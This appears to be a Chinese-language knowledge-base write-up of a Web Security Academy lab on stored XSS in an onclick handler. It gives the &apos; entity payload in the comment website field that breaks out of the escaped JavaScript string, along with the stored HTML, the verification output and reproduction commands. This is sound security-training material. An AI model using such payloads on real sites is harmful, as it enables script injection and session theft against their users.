---
title: "lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped"
links:
  - target: xss-context-family
    relation: evidences
---

# lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

> evidences: [[xss-context-family]]

- 题面:Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped(/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
- 实例:https://0acc00d2049a288780c203c6007a00ec.web-security-academy.net
- 判定目标:提交评论,点作者名触发 `alert(1)`;状态:**solved**(solved_check true)

## 关键步

1. `/post?postId=1` 评论表单 POST `/post/comment`(csrf,postId,comment,name,email,website)。
2. 带 website 的评论渲染为:
   `<a id="author" href="URL" onclick="var tracker={track(){}};tracker.track('URL');">NAME</a>`
   —— `'`→`\'`、`\`→`\\`;`<`/`"` HTML 编码。裸 `'` 破不了串。
3. **绕过:HTML 实体 `&apos;`**(服务端不编码 `&`):website =
   `http://x/?a=&apos;-alert(1)-&apos;`
   存储后浏览器解析 onclick 属性时先把 `&apos;` 解码成 `'`,JS 才见到 → 破串。
4. 判读:`lab_alert <post-url> --driver "…find(a=>a.textContent.trim()=='B18B').onclick()"`
   → `fired:true, alerts:["alert:1"]`。**必须直接调 `onclick()`**:用 `a.click()` 会跳转
   `http://x/…` 销毁文档,预挂 `__labAlerts` 丢失 → 假阴性。

## 证据摘录

```
stored: <a id="author" href="http://x/?a=&apos;-alert(1)-&apos;"
        onclick="var tracker={track(){}};tracker.track('http://x/?a=&apos;-alert(1)-&apos;');">B18B</a>
lab_alert --driver "…onclick()" -> {"fired":true,"alerts":["alert:1"]}
solved_check -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_launch launch 53DDF9EF1ABEEE631133A34645F234B5A0115EB9E739C4CEBBE2A4668735893B --jar <jar>
lab_http post "<inst>/post/comment" --jar <jar> --form csrf=<csrf> --form postId=1 \
  --form comment=p --form name=B18B --form email=a@b.co --form "website=http://x/?a=&apos;-alert(1)-&apos;"
lab_alert "<inst>/post?postId=1" --driver "var a=[...document.querySelectorAll('a#author')].find(x=>x.textContent.trim()=='B18B'); a && a.onclick();"
solved_check "<inst>/" --jar <jar>
```
